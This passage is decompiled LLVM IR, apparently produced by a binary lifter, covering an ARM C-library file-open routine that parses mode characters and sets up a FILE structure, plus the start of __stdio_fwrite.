  store i32 %v0_19c08, i32* @r6, align 4
  %v0_19c0c = load i32, i32* @r2, align 4
  store i32 %v0_19c0c, i32* @sb, align 4
  %v0_19c10 = load i32, i32* @r3, align 4
  store i32 %v0_19c10, i32* @r5, align 4
  br i1 %v7_19bfc, label %dec_label_pc_19c5c, label %dec_label_pc_19c18

dec_label_pc_19c18:                               ; preds = %entry
  %v7_19c18 = icmp eq i8 %v2_19bf4, 119
  br i1 %v7_19c18, label %bb, label %dec_label_pc_19c24

bb:                                               ; preds = %dec_label_pc_19c18
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_19c60

dec_label_pc_19c24:                               ; preds = %dec_label_pc_19c18
  %v7_19c24 = icmp eq i8 %v2_19bf4, 97
  br i1 %v7_19c24, label %bb34, label %dec_label_pc_19c30

bb34:                                             ; preds = %dec_label_pc_19c24
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_19c60

dec_label_pc_19c30:                               ; preds = %dec_label_pc_19c24, %dec_label_pc_19ce4, %dec_label_pc_19cb8
  %v0_19c30 = call i32 @__GI___errno_location()
  store i32 %v0_19c30, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_19c38 = load i32, i32* @sb, align 4
  %v2_19c38 = icmp eq i32 %v0_19c38, 0
  %v2_19c3c = inttoptr i32 %v0_19c30 to i32*
  store i32 22, i32* %v2_19c3c, align 4
  br i1 %v2_19c38, label %dec_label_pc_19eb0, label %dec_label_pc_19c44

dec_label_pc_19c44:                               ; preds = %dec_label_pc_19d08._crit_edge, %dec_label_pc_19c30
  %v0_19c44 = load i32, i32* @sb, align 4
  %v1_19c44 = inttoptr i32 %v0_19c44 to i16*
  %v2_19c44 = load i16, i16* %v1_19c44, align 2
  %v3_19c44 = zext i16 %v2_19c44 to i32
  store i32 %v3_19c44, i32* %r3.global-to-local, align 4
  %v1_19c48 = and i32 %v3_19c44, 8192
  %v2_19c48 = icmp eq i32 %v1_19c48, 0
  br i1 %v2_19c48, label %dec_label_pc_19eb0, label %dec_label_pc_19c50

dec_label_pc_19c50:                               ; preds = %dec_label_pc_19c44
  store i32 %v0_19c44, i32* @r0, align 4
  %v0_19c54 = call i32 @free()
  store i32 %v0_19c54, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19eb0

dec_label_pc_19c5c:                               ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_19c60

dec_label_pc_19c60:                               ; preds = %bb, %bb34, %dec_label_pc_19c5c
  %v1_19c78 = phi i32 [ 1089, %bb34 ], [ 577, %bb ], [ 1, %dec_label_pc_19c5c ]
  %v1_19c60 = add i32 %v0_19bf4, 1
  %v2_19c60 = inttoptr i32 %v1_19c60 to i8*
  %v3_19c60 = load i8, i8* %v2_19c60, align 1
  %v7_19c64 = icmp eq i8 %v3_19c60, 98
  %v1_19c60.v0_19bf4 = select i1 %v7_19c64, i32 %v1_19c60, i32 %v0_19bf4
  store i32 %v1_19c60.v0_19bf4, i32* %r3.global-to-local, align 4
  %v1_19c70 = add i32 %v1_19c60.v0_19bf4, 1
  %v2_19c70 = inttoptr i32 %v1_19c70 to i8*
  %v3_19c70 = load i8, i8* %v2_19c70, align 1
  %v4_19c70 = zext i8 %v3_19c70 to i32
  store i32 %v4_19c70, i32* @r3, align 4
  %v7_19c74 = icmp eq i8 %v3_19c70, 43
  br i1 %v7_19c74, label %bb37, label %.thread5

bb37:                                             ; preds = %dec_label_pc_19c60
  store i32 %v1_19c78, i32* @r3, align 4
  %v2_19c7c = add nuw nsw i32 %v1_19c78, 1
  store i32 %v2_19c7c, i32* @r4, align 4
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_19c60, %bb37
  %v2_19c80 = icmp eq i32 %v0_19c0c, 0
  br i1 %v2_19c80, label %dec_label_pc_19c88, label %dec_label_pc_19cb0

dec_label_pc_19c88:                               ; preds = %.thread5
  store i32 80, i32* %r0.global-to-local, align 4
  %v1_19c8c = call i32 @malloc(i32 80)
  store i32 %v1_19c8c, i32* %r0.global-to-local, align 4
  store i32 %v1_19c8c, i32* @sb, align 4
  %v3_19c90 = icmp eq i32 %v1_19c8c, 0
  br i1 %v3_19c90, label %dec_label_pc_19eb4, label %dec_label_pc_19c98

dec_label_pc_19c98:                               ; preds = %dec_label_pc_19c88
  %v2_19c9c = add i32 %v1_19c8c, 8
  %v3_19c9c = inttoptr i32 %v2_19c9c to i32*
  store i32 0, i32* %v3_19c9c, align 4
  store i32 8192, i32* %r3.global-to-local, align 4
  %v2_19ca4 = load i32, i32* @sb, align 4
  %v3_19ca4 = inttoptr i32 %v2_19ca4 to i16*
  store i16 8192, i16* %v3_19ca4, align 2
  %v0_19ca8 = load i32, i32* @sb, align 4
  %v1_19ca8 = add i32 %v0_19ca8, 56
  store i32 %v1_19ca8, i32* @r0, align 4
  %v1_19cac = call i32 @__stdio_init_mutex(i32 %v1_19ca8)
  store i32 %v1_19cac, i32* %r0.global-to-local, align 4
  %v0_19cb0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_19cb0

dec_label_pc_19cb0:                               ; preds = %.thread5, %dec_label_pc_19c98
  %v0_19d08 = phi i32 [ %v0_19c10, %.thread5 ], [ %v0_19cb0.pre, %dec_label_pc_19c98 ]
  %v1_19cb0 = icmp slt i32 %v0_19d08, 0
  br i1 %v1_19cb0, label %dec_label_pc_19d08, label %dec_label_pc_19cb8

dec_label_pc_19cb8:                               ; preds = %dec_label_pc_19cb0
  %v0_19cbc = load i32, i32* @r4, align 4
  %v2_19cbc = and i32 %v0_19cbc, ptrtoint (i32* @global_var_20003.1132 to i32)
  %v1_19cc0 = or i32 %v2_19cbc, 1
  store i32 %v1_19cc0, i32* @r2, align 4
  %v0_19cc4 = load i32, i32* @r6, align 4
  %v1_19cc4 = add i32 %v0_19cc4, 1
  %v2_19cc8 = and i32 %v1_19cc4, %v1_19cc0
  store i32 %v2_19cc8, i32* %r3.global-to-local, align 4
  %v9_19ccc = icmp eq i32 %v2_19cc8, %v1_19cc0
  %v1_19cd0 = load i32, i32* @sb, align 4
  %v2_19cd0 = add i32 %v1_19cd0, 4
  %v3_19cd0 = inttoptr i32 %v2_19cd0 to i32*
  store i32 %v0_19d08, i32* %v3_19cd0, align 4
  br i1 %v9_19ccc, label %dec_label_pc_19cd8, label %dec_label_pc_19c30

dec_label_pc_19cd8:                               ; preds = %dec_label_pc_19cb8
  %v0_19cd8 = load i32, i32* @r4, align 4
  %v1_19cd8 = load i32, i32* @r6, align 4
  %v2_19cd8 = sub i32 -1, %v1_19cd8
  %v3_19cd8 = and i32 %v0_19cd8, %v2_19cd8
  store i32 %v3_19cd8, i32* @r3, align 4
  %v1_19cdc = and i32 %v3_19cd8, 1024
  %v2_19cdc = icmp eq i32 %v1_19cdc, 0
  br i1 %v2_19cdc, label %dec_label_pc_19cfc, label %dec_label_pc_19ce4

dec_label_pc_19ce4:                               ; preds = %dec_label_pc_19cd8
  %v0_19ce4 = load i32, i32* @r5, align 4
  store i32 %v0_19ce4, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v2_19cf0 = call i32 @__libc_fcntl(i32 %v0_19ce4, i32 4)
  store i32 %v2_19cf0, i32* %r0.global-to-local, align 4
  %v2_19cf4 = icmp eq i32 %v2_19cf0, 0
  br i1 %v2_19cf4, label %dec_label_pc_19ce4.dec_label_pc_19cfc_crit_edge, label %dec_label_pc_19c30

dec_label_pc_19ce4.dec_label_pc_19cfc_crit_edge:  ; preds = %dec_label_pc_19ce4
  %v0_19cfc.pre = load i32, i32* @r6, align 4
  %v0_19d00.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_19cfc

dec_label_pc_19cfc:                               ; preds = %dec_label_pc_19ce4.dec_label_pc_19cfc_crit_edge, %dec_label_pc_19cd8
  %v0_19d00 = phi i32 [ %v0_19d00.pre, %dec_label_pc_19ce4.dec_label_pc_19cfc_crit_edge ], [ %v0_19cd8, %dec_label_pc_19cd8 ]
  %v0_19cfc = phi i32 [ %v0_19cfc.pre, %dec_label_pc_19ce4.dec_label_pc_19cfc_crit_edge ], [ %v1_19cd8, %dec_label_pc_19cd8 ]
  %v1_19cfc = and i32 %v0_19cfc, 131072
  store i32 %v1_19cfc, i32* %r3.global-to-local, align 4
  %v2_19d00 = or i32 %v1_19cfc, %v0_19d00
  store i32 %v2_19d00, i32* @r4, align 4
  br label %dec_label_pc_19d2c

dec_label_pc_19d08:                               ; preds = %dec_label_pc_19cb0
  %v7_19d08 = icmp eq i32 %v0_19d08, -1
  %v0_19d14.pre = load i32, i32* @r4, align 4
  br i1 %v7_19d08, label %dec_label_pc_19d08._crit_edge, label %bb38

bb38:                                             ; preds = %dec_label_pc_19d08
  %v2_19d0c = or i32 %v0_19d14.pre, ptrtoint (i32* @global_var_20000.1133 to i32)
  store i32 %v2_19d0c, i32* @r4, align 4
  br label %dec_label_pc_19d08._crit_edge

dec_label_pc_19d08._crit_edge:                    ; preds = %dec_label_pc_19d08, %bb38
  %v0_19d14 = phi i32 [ %v2_19d0c, %bb38 ], [ %v0_19d14.pre, %dec_label_pc_19d08 ]
  %v0_19d10 = load i32, i32* @r6, align 4
  store i32 %v0_19d10, i32* %r0.global-to-local, align 4
  store i32 %v0_19d14, i32* %r1.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_19d1c = call i32 @__GI_open(i32 %v0_19d10, i32 %v0_19d14)
  store i32 %v2_19d1c, i32* %r0.global-to-local, align 4
  %v1_19d20 = icmp slt i32 %v2_19d1c, 0
  %v1_19d24 = load i32, i32* @sb, align 4
  %v2_19d24 = add i32 %v1_19d24, 4
  %v3_19d24 = inttoptr i32 %v2_19d24 to i32*
  store i32 %v2_19d1c, i32* %v3_19d24, align 4
  br i1 %v1_19d20, label %dec_label_pc_19c44, label %.dec_label_pc_19d2c_crit_edge

.dec_label_pc_19d2c_crit_edge:                    ; preds = %dec_label_pc_19d08._crit_edge
  %v0_19d30.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_19d2c

dec_label_pc_19d2c:                               ; preds = %.dec_label_pc_19d2c_crit_edge, %dec_label_pc_19cfc
  %v0_19d48 = phi i32 [ %v0_19d30.pre, %.dec_label_pc_19d2c_crit_edge ], [ %v2_19d00, %dec_label_pc_19cfc ]
  %v0_19d2c = load i32, i32* @sb, align 4
  %v1_19d2c = inttoptr i32 %v0_19d2c to i16*
  %v2_19d2c = load i16, i16* %v1_19d2c, align 2
  %v3_19d2c = zext i16 %v2_19d2c to i32
  %v1_19d30 = urem i32 %v0_19d48, 4
  %v1_19d34 = and i32 %v0_19d48, 1024
  %v1_19d38 = and i32 %v3_19d2c, 8192
  %v1_19d3c = add nuw nsw i32 %v1_19d30, 1
  %v2_19d40 = or i32 %v1_19d38, %v1_19d34
  store i32 %v2_19d40, i32* %r3.global-to-local, align 4
  %v1_19d44 = xor i32 %v1_19d3c, 3
  store i32 %v1_19d44, i32* %r1.global-to-local, align 4
  %v1_19d48 = and i32 %v0_19d48, ptrtoint (i32* @global_var_20000.1133 to i32)
  store i32 %v1_19d48, i32* %r2.global-to-local, align 4
  %v2_19d48 = icmp eq i32 %v1_19d48, 0
  %v1_19d4c = add i32 %v0_19d2c, 4
  %v2_19d4c = inttoptr i32 %v1_19d4c to i32*
  %v3_19d4c = load i32, i32* %v2_19d4c, align 4
  store i32 %v3_19d4c, i32* @r5, align 4
  br i1 %v2_19d48, label %bb40, label %bb39

bb39:                                             ; preds = %dec_label_pc_19d2c
  store i32 32768, i32* %r2.global-to-local, align 4
  br label %bb40

bb40:                                             ; preds = %dec_label_pc_19d2c, %bb39
  %v0_19d58 = phi i32 [ 0, %dec_label_pc_19d2c ], [ 32768, %bb39 ]
  %v4_19d54 = mul nuw nsw i32 %v1_19d44, 16
  %v5_19d54 = or i32 %v2_19d40, %v4_19d54
  store i32 %v5_19d54, i32* %r3.global-to-local, align 4
  %v2_19d58 = or i32 %v0_19d58, %v5_19d54
  store i32 %v2_19d58, i32* %r2.global-to-local, align 4
  %v8_19d5c = icmp eq i32 %v3_19d4c, 2147483647
  %v1_19d60 = trunc i32 %v2_19d58 to i16
  store i16 %v1_19d60, i16* %v1_19d2c, align 2
  br i1 %v8_19d5c, label %dec_label_pc_19d90, label %dec_label_pc_19d68

dec_label_pc_19d68:                               ; preds = %bb40
  %v0_19d68 = call i32 @__GI___errno_location()
  store i32 %v0_19d68, i32* @r4, align 4
  %v0_19d70 = load i32, i32* @r5, align 4
  store i32 %v0_19d70, i32* @r0, align 4
  %v1_19d74 = inttoptr i32 %v0_19d68 to i32*
  %v2_19d74 = load i32, i32* %v1_19d74, align 4
  store i32 %v2_19d74, i32* @r5, align 4
  %v1_19d78 = call i32 @isatty(i32 %v0_19d70)
  store i32 %v1_19d78, i32* %r0.global-to-local, align 4
  %v2_19d7c = icmp eq i32 %v1_19d78, 0
  br i1 %v2_19d7c, label %.thread7, label %bb41

bb41:                                             ; preds = %dec_label_pc_19d68
  %v1_19d80 = load i32, i32* @sb, align 4
  %v2_19d80 = inttoptr i32 %v1_19d80 to i16*
  %v3_19d80 = load i16, i16* %v2_19d80, align 2
  %v4_19d80 = zext i16 %v3_19d80 to i32
  %v2_19d84 = or i32 %v4_19d80, 256
  store i32 %v2_19d84, i32* %r3.global-to-local, align 4
  %v2_19d88 = trunc i32 %v2_19d84 to i16
  store i16 %v2_19d88, i16* %v2_19d80, align 2
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_19d68, %bb41
  %v0_19d8c = load i32, i32* @r5, align 4
  %v1_19d8c = load i32, i32* @r4, align 4
  %v2_19d8c = inttoptr i32 %v1_19d8c to i32*
  store i32 %v0_19d8c, i32* %v2_19d8c, align 4
  br label %dec_label_pc_19d90

dec_label_pc_19d90:                               ; preds = %bb40, %.thread7
  %v0_19d90 = load i32, i32* @sb, align 4
  %v1_19d90 = add i32 %v0_19d90, 8
  %v2_19d90 = inttoptr i32 %v1_19d90 to i32*
  %v3_19d90 = load i32, i32* %v2_19d90, align 4
  store i32 %v3_19d90, i32* %r3.global-to-local, align 4
  %v2_19d94 = icmp eq i32 %v3_19d90, 0
  br i1 %v2_19d94, label %dec_label_pc_19d9c, label %bb42

dec_label_pc_19d9c:                               ; preds = %dec_label_pc_19d90
  store i32 4096, i32* %r0.global-to-local, align 4
  %v1_19da0 = call i32 @malloc(i32 4096)
  store i32 %v1_19da0, i32* %r0.global-to-local, align 4
  %v2_19da4 = icmp eq i32 %v1_19da0, 0
  %v1_19db4.pre = load i32, i32* @sb, align 4
  br i1 %v2_19da4, label %.thread11, label %.thread10

.thread10:                                        ; preds = %dec_label_pc_19d9c
  %v2_19da8 = inttoptr i32 %v1_19db4.pre to i16*
  %v3_19da8 = load i16, i16* %v2_19da8, align 2
  %v4_19da8 = zext i16 %v3_19da8 to i32
  %v2_19dac = add i32 %v1_19da0, 4096
  store i32 %v2_19dac, i32* %r2.global-to-local, align 4
  %v2_19db0 = or i32 %v4_19da8, 16384
  store i32 %v2_19db0, i32* %r3.global-to-local, align 4
  %v2_19db4 = add i32 %v1_19db4.pre, 8
  %v3_19db4 = inttoptr i32 %v2_19db4 to i32*
  store i32 %v1_19da0, i32* %v3_19db4, align 4
  %v1_19db8 = load i32, i32* %r2.global-to-local, align 4
  %v2_19db8 = load i32, i32* @sb, align 4
  %v3_19db8 = add i32 %v2_19db8, 12
  %v4_19db8 = inttoptr i32 %v3_19db8 to i32*
  store i32 %v1_19db8, i32* %v4_19db8, align 4
  %v1_19dbc = load i32, i32* %r3.global-to-local, align 4
  %v2_19dbc = trunc i32 %v1_19dbc to i16
  %v3_19dbc = load i32, i32* @sb, align 4
  %v4_19dbc = inttoptr i32 %v3_19dbc to i16*
  store i16 %v2_19dbc, i16* %v4_19dbc, align 2
  br label %bb42

.thread11:                                        ; preds = %dec_label_pc_19d9c
  %v2_19db421 = add i32 %v1_19db4.pre, 8
  %v3_19db422 = inttoptr i32 %v2_19db421 to i32*
  store i32 0, i32* %v3_19db422, align 4
  %v2_19dc0 = load i32, i32* @sb, align 4
  %v3_19dc0 = add i32 %v2_19dc0, 12
  %v4_19dc0 = inttoptr i32 %v3_19dc0 to i32*
  store i32 0, i32* %v4_19dc0, align 4
  br label %bb42

bb42:                                             ; preds = %.thread10, %dec_label_pc_19d90, %.thread11
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_19dcc = load i32, i32* @fp, align 4
  %v2_19dcc = add i32 %v0_19dcc, 64
  %v3_19dcc = inttoptr i32 %v2_19dcc to i32*
  %v4_19dcc = load i32, i32* %v3_19dcc, align 4
  store i32 %v4_19dcc, i32* %r3.global-to-local, align 4
  %v2_19dd0 = load i32, i32* @sb, align 4
  %v3_19dd0 = add i32 %v2_19dd0, 2
  %v4_19dd0 = inttoptr i32 %v3_19dd0 to i8*
  store i8 0, i8* %v4_19dd0, align 1
  %v0_19dd4 = load i32, i32* @sb, align 4
  %v1_19dd4 = inttoptr i32 %v0_19dd4 to i16*
  %v2_19dd4 = load i16, i16* %v1_19dd4, align 2
  %v3_19dd4 = zext i16 %v2_19dd4 to i32
  store i32 %v3_19dd4, i32* @r2, align 4
  %v0_19dd8 = load i32, i32* %r3.global-to-local, align 4
  %v1_19dd8 = inttoptr i32 %v0_19dd8 to i32*
  %v2_19dd8 = load i32, i32* %v1_19dd8, align 4
  store i32 %v2_19dd8, i32* %r1.global-to-local, align 4
  %v1_19ddc = add i32 %v0_19dd4, 8
  %v2_19ddc = inttoptr i32 %v1_19ddc to i32*
  %v3_19ddc = load i32, i32* %v2_19ddc, align 4
  store i32 %v3_19ddc, i32* %r3.global-to-local, align 4
  %v1_19de0 = and i32 %v3_19dd4, 8192
  %v2_19de0 = icmp eq i32 %v1_19de0, 0
  %v2_19de4 = add i32 %v0_19dd4, 20
  %v3_19de4 = inttoptr i32 %v2_19de4 to i32*
  store i32 %v3_19ddc, i32* %v3_19de4, align 4
  %v0_19de8 = load i32, i32* %r0.global-to-local, align 4
  %v1_19de8 = load i32, i32* @sb, align 4
  %v2_19de8 = add i32 %v1_19de8, 44
  %v3_19de8 = inttoptr i32 %v2_19de8 to i32*
  store i32 %v0_19de8, i32* %v3_19de8, align 4
  %v0_19dec = load i32, i32* %r1.global-to-local, align 4
  %v1_19dec = load i32, i32* @sb, align 4
  %v2_19dec = add i32 %v1_19dec, 52
  %v3_19dec = inttoptr i32 %v2_19dec to i32*
  store i32 %v0_19dec, i32* %v3_19dec, align 4
  %v0_19df0 = load i32, i32* %r3.global-to-local, align 4
  %v1_19df0 = load i32, i32* @sb, align 4
  %v2_19df0 = add i32 %v1_19df0, 24
  %v3_19df0 = inttoptr i32 %v2_19df0 to i32*
  store i32 %v0_19df0, i32* %v3_19df0, align 4
  %v0_19df4 = load i32, i32* %r3.global-to-local, align 4
  %v1_19df4 = load i32, i32* @sb, align 4
  %v2_19df4 = add i32 %v1_19df4, 28
  %v3_19df4 = inttoptr i32 %v2_19df4 to i32*
  store i32 %v0_19df4, i32* %v3_19df4, align 4
  %v0_19df8 = load i32, i32* %r3.global-to-local, align 4
  %v1_19df8 = load i32, i32* @sb, align 4
  %v2_19df8 = add i32 %v1_19df8, 16
  %v3_19df8 = inttoptr i32 %v2_19df8 to i32*
  store i32 %v0_19df8, i32* %v3_19df8, align 4
  br i1 %v2_19de0, label %dec_label_pc_19eb4, label %dec_label_pc_19e00

dec_label_pc_19e00:                               ; preds = %bb42
  store i32 40, i32* %r3.global-to-local, align 4
  %v0_19e04 = load i32, i32* @fp, align 4
  %v2_19e04 = add i32 %v0_19e04, 40
  %v3_19e04 = inttoptr i32 %v2_19e04 to i32*
  %v4_19e04 = load i32, i32* %v3_19e04, align 4
  store i32 %v4_19e04, i32* %r8.global-to-local, align 4
  store i32 120, i32* %r3.global-to-local, align 4
  %v2_19e0c = add i32 %v0_19e04, 120
  %v3_19e0c = inttoptr i32 %v2_19e0c to i32*
  %v4_19e0c = load i32, i32* %v3_19e0c, align 4
  store i32 %v4_19e0c, i32* %r4.global-to-local, align 4
  store i32 80, i32* %r3.global-to-local, align 4
  %v2_19e14 = ptrtoint i32* %stack_var_-56 to i32
  %v2_19e18 = add i32 %v0_19e04, 80
  %v3_19e18 = inttoptr i32 %v2_19e18 to i32*
  %v4_19e18 = load i32, i32* %v3_19e18, align 4
  store i32 %v4_19e04, i32* %r1.global-to-local, align 4
  store i32 %v4_19e0c, i32* %r2.global-to-local, align 4
  store i32 %v2_19e14, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_19e18)
  store i32 20, i32* %r3.global-to-local, align 4
  %v0_19e34 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_19e34, i32* %r0.global-to-local, align 4
  %v0_19e38 = load i32, i32* @fp, align 4
  %v2_19e38 = add i32 %v0_19e38, 20
  %v3_19e38 = inttoptr i32 %v2_19e38 to i32*
  %v4_19e38 = load i32, i32* %v3_19e38, align 4
  call void @__pseudo_branch(i32 %v4_19e38)
  store i32 108, i32* %r3.global-to-local, align 4
  %v0_19e48 = load i32, i32* @fp, align 4
  %v2_19e48 = add i32 %v0_19e48, 108
  %v3_19e48 = inttoptr i32 %v2_19e48 to i32*
  %v4_19e48 = load i32, i32* %v3_19e48, align 4
  store i32 %v4_19e48, i32* %r4.global-to-local, align 4
  %v0_19e4c = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_19e4c, i32* %r1.global-to-local, align 4
  store i32 %v4_19e48, i32* %r2.global-to-local, align 4
  store i32 %v2_19c04, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_19e18)
  store i32 %v4_19e48, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_19e38)
  store i32 52, i32* %r3.global-to-local, align 4
  %v0_19e70 = load i32, i32* @fp, align 4
  %v2_19e70 = add i32 %v0_19e70, 52
  %v3_19e70 = inttoptr i32 %v2_19e70 to i32*
  %v4_19e70 = load i32, i32* %v3_19e70, align 4
  store i32 %v4_19e70, i32* @ip, align 4
  store i32 28, i32* %r3.global-to-local, align 4
  %v1_19e78 = inttoptr i32 %v4_19e70 to i32*
  %v2_19e78 = load i32, i32* %v1_19e78, align 4
  store i32 %v2_19e78, i32* @r2, align 4
  store i32 %v2_19c04, i32* %r0.global-to-local, align 4
  %v1_19e80 = load i32, i32* @sb, align 4
  %v2_19e80 = add i32 %v1_19e80, 32
  %v3_19e80 = inttoptr i32 %v2_19e80 to i32*
  store i32 %v2_19e78, i32* %v3_19e80, align 4
  %v0_19e84 = load i32, i32* @fp, align 4
  %v1_19e84 = load i32, i32* %r3.global-to-local, align 4
  %v2_19e84 = add i32 %v1_19e84, %v0_19e84
  %v3_19e84 = inttoptr i32 %v2_19e84 to i32*
  %v4_19e84 = load i32, i32* %v3_19e84, align 4
  store i32 %v4_19e84, i32* %r4.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_19e8c = load i32, i32* @sb, align 4
  %v1_19e8c = load i32, i32* @ip, align 4
  %v2_19e8c = inttoptr i32 %v1_19e8c to i32*
  store i32 %v0_19e8c, i32* %v2_19e8c, align 4
  call void @__pseudo_branch(i32 %v4_19e84)
  store i32 %v2_19e14, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_19e84)
  br label %dec_label_pc_19eb4

dec_label_pc_19eb0:                               ; preds = %dec_label_pc_19c44, %dec_label_pc_19c30, %dec_label_pc_19c50
  store i32 0, i32* @sb, align 4
  br label %dec_label_pc_19eb4

dec_label_pc_19eb4:                               ; preds = %bb42, %dec_label_pc_19c88, %dec_label_pc_19e00, %dec_label_pc_19eb0
  %v0_19eb4 = load i32, i32* @sb, align 4
  store i32 %v0_19eb4, i32* %r0.global-to-local, align 4
  %v2_19ebc = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_19ebc, i32* @r4, align 4
  store i32 %v6_19bf0, i32* @r5, align 4
  store i32 %v9_19bf0, i32* @r6, align 4
  store i32 %v18_19bf0, i32* @sb, align 4
  store i32 %v24_19bf0, i32* @fp, align 4
  ret i32 %v0_19eb4

; uselistorder directives
  uselistorder i32 %v1_19db4.pre, { 2, 1, 0 }
  uselistorder i32 %v0_19d48, { 1, 2, 0 }
  uselistorder i32 %v0_19d14, { 1, 0 }
  uselistorder i32 %v1_19cd8, { 1, 0 }
  uselistorder i32 %v0_19cd8, { 1, 0 }
  uselistorder i32 %v1_19cc0, { 1, 0, 2 }
  uselistorder i32 %v1_19c78, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0, 25, 26 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 4, 3, 5, 6, 7, 8, 10, 9, 11, 13, 12, 15, 14, 16, 18, 17, 19, 20 }
  uselistorder i32 16384, { 12, 11, 0, 1, 6, 4, 5, 2, 3, 7, 8, 9, 10 }
  uselistorder i32 (i32)* @isatty, { 0, 2, 1 }
  uselistorder i32 2147483647, { 0, 1, 6, 2, 5, 3, 4 }
  uselistorder i32 (i32, i32)* @__GI_open, { 3, 0, 4, 2, 1 }
  uselistorder i32 131072, { 1, 0 }
  uselistorder i32 (i32, i32)* @__libc_fcntl, { 1, 10, 0, 9, 8, 7, 6, 14, 13, 12, 11, 5, 4, 3, 2 }
  uselistorder i32 (i32)* @__stdio_init_mutex, { 0, 4, 3, 2, 1 }
  uselistorder i8 114, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_19eb4, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_19eb0, { 2, 0, 1 }
  uselistorder label %bb42, { 2, 0, 1 }
  uselistorder label %dec_label_pc_19d90, { 1, 0 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %bb40, { 1, 0 }
  uselistorder label %dec_label_pc_19d08._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_19cb0, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %dec_label_pc_19c60, { 2, 1, 0 }
  uselistorder label %dec_label_pc_19c30, { 1, 2, 0 }
}

define i32 @function_19ec8(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_19ec8:
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_19ec8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_19ec8, label %bb, label %.thread10

bb:                                               ; preds = %dec_label_pc_19ec8
  %v3_19ed0 = and i32 %arg4, %arg3
  %v2_19ed4 = trunc i32 %v3_19ed0 to i16
  %v4_19ed4 = inttoptr i32 %v3_19ed0 to i16*
  store i16 %v2_19ed4, i16* %v4_19ed4, align 2
  br label %.thread10

.thread10:                                        ; preds = %dec_label_pc_19ec8, %bb
  %v10_19ef4 = phi i32 [ %tmp, %dec_label_pc_19ec8 ], [ 0, %bb ]
  ret i32 %v10_19ef4

; uselistorder directives
  uselistorder i32 %v3_19ed0, { 1, 0 }
  uselistorder label %.thread10, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i16* %arg3) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg3 to i32
  %stack_var_-20 = alloca i32, align 4
  %v3_19ef8 = load i32, i32* @r4, align 4
  store i32 %v3_19ef8, i32* %stack_var_-20, align 4
  %v6_19ef8 = load i32, i32* @r5, align 4
  %v9_19ef8 = load i32, i32* @r6, align 4
  %v12_19ef8 = load i32, i32* @r7, align 4
  %v3_19efc = load i16, i16* %arg3, align 2
  %v4_19efc = zext i16 %v3_19efc to i32
  %v1_19f00 = and i32 %v4_19efc, 512
  store i32 %v1_19f00, i32* @r4, align 4
  %v2_19f00 = icmp eq i32 %v1_19f00, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_19f00, label %dec_label_pc_19f18, label %dec_label_pc_1a014

dec_label_pc_19f18:                               ; preds = %entry
  %v2_19f18 = add i32 %tmp, 4
  %v3_19f18 = inttoptr i32 %v2_19f18 to i32*
  %v4_19f18 = load i32, i32* %v3_19f18, align 4
  %v2_19f20 = add i32 %tmp, 16
  %v3_19f20 = inttoptr i32 %v2_19f20 to i32*
  %v4_19f20 = load i32, i32* %v3_19f20, align 4
  store i32 %v4_19f20, i32* @r0, align 4
  %v2_19f24 = add i32 %tmp, 12
  %v3_19f24 = inttoptr i32 %v2_19f24 to i32*
  %v4_19f24 = load i32, i32* %v3_19f24, align 4
  store i32 %v4_19f24, i32* @r3, align 4
  %v4_19f28 = icmp eq i32 %v4_19f18, -2
  %v2_19f2c = sub i32 %v4_19f24, %v4_19f20
  br i1 %v4_19f28, label %dec_label_pc_19f2c, label %dec_label_pc_19f54

dec_label_pc_19f2c:                               ; preds = %dec_label_pc_19f18
  %v3_19f30 = icmp ugt i32 %v2_19f2c, %arg2
  br i1 %v3_19f30, label %bb, label %bb12

bb:                                               ; preds = %dec_label_pc_19f2c
  br label %bb12

bb12:                                             ; preds = %dec_label_pc_19f2c, %bb
  %storemerge = phi i32 [ %arg2, %bb ], [ %v2_19f2c, %dec_label_pc_19f2c ]
  %v0_19f38 = phi i32 [ %arg2, %bb ], [ %v2_19f2c, %dec_label_pc_19f2c ]
  store i32 %storemerge, i32* @r4, align 4
  store i32 %v0_19f38, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_19f40 = call i32 @memcpy()
